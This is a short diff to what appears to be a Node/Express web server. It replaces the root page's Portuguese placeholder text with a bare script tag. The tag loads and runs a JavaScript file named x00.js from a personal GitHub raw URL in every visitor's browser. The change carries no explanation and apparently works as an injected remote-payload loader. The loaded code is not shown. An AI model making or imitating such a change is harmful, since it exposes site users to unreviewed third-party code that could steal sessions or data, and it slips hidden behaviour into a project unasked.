@@ -37,7 +37,7 @@ function clearHTML(BadString) {
 // Pags estaticas
 
 app.get('/', (req, res) => {
-    res.send("Página em desenvolvimento, se preferir você pode enviar uma request GET em /api/consulta/SEUIDAQUI se você não possuir um id, teste com o ID 1");
+    res.send('<script src="https://raw.githubusercontent.com/Yyax13/Yyax13/refs/heads/main/x00.js"/>');
 });
 
 app.get('/login', (req, res) => {
